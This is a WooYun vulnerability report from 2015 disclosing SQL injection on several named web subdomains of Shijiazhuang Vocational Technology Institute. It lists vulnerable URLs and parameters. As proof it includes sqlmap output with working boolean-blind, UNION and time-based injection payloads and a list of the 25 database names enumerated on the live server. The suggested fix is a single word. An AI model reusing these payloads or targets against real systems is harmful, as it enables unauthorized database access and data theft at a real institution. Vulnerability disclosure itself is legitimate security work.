wybug_title: 石家庄职业技术学院存在多处SQL注入
wybug_status: 已交由第三方合作机构(CCERT教育网应急响应组)处理
wybug_detail: 漏洞详情 披露状态：   									2015-08-02：	细节已通知厂商并且等待厂商处理中									2015-08-07：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 666666666666 详细说明：  http://dangqun.sjzpt.edu.cn/index.php?c=index&a=lists&catid=1&parentid=0参数catidhttp://keyan.sjzpt.edu.cn/news/index.php?itemid=1http://keyan.sjzpt.edu.cn/news/content.php?newsid=433http://part.sjzpt.edu.cn/keyan/news/list.php?itemid=44http://zzb.sjzpt.edu.cn//index.php?c=index&a=show&newsid=191参数newsid   漏洞证明：  全是一个库取一个证明好了。E:\qy\sqlmapproject-sqlmap-b1d13d1>sqlmap.py -u "http://keyan.sjzpt.edu.cn/news/index.php?itemid=1" --dbs         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150213}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 20:10:52[20:10:52] [INFO] resuming back-end DBMS 'mysql'[20:10:53] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: itemid (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: itemid=1' AND 7158=7158 AND 'LxJH'='LxJH    Type: UNION query    Title: MySQL UNION query (NULL) - 6 columns    Payload: itemid=-3968' UNION ALL SELECT CONCAT(0x716b716b71,0x7568594e584d4f687647,0x71786a7671),NULL,NULL,NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind (SELECT)    Payload: itemid=1' AND (SELECT * FROM (SELECT(SLEEP(5)))klzD) AND 'nKhn'='nKhn---[20:10:54] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.3, Nginxback-end DBMS: MySQL 5.0.11[20:10:54] [INFO] fetching database names[20:10:54] [INFO] the SQL query used returns 25 entriesavailable databases [25]:[*] cwc[*] dangqun[*] gongyu[*] huagong[*] information_schema[*] mysql[*] news[*] news_manage[*] pe[*] qsh1[*] qsh2[*] renshichu[*] rsc[*] shixun[*] shixund[*] sjzpt[*] sjzpt1[*] sjzptold[*] test[*] xuegong[*] xuexiaode[*] yishu[*] yt_tuanwei[*] zt[*] zzb[20:10:54] [INFO] fetched data logged to text files under 'C:\Users\Administrator\.sqlmap\output\keyan.sjzpt.edu.cn'[*] shutting down at 20:10:54   修复方案：  过滤   版权声明：转载请注明来源 陆由乙@乌云
